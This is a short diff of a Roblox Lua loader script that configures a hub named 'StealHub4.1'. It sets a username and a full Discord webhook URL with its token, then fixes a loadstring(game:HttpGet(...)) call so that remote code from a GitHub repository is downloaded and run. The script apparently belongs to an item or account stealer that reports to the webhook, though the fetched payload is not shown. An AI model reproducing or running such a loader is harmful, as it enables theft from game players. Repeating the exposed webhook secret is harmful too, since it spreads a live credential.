@@ -2,4 +2,4 @@ _G.Username "LivingAries"
 _G.HubName "StealHub4.1"
 _G.WebhookUrl "https://discord.com/api/webhooks/1125048577761235026/UrlDp78xZtWNB8iJ8vsuM0zZBsYb4CSkv1GnkF19FYrF5h4A2dptqyRSexCJCWdmoE3E" 
 
-loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
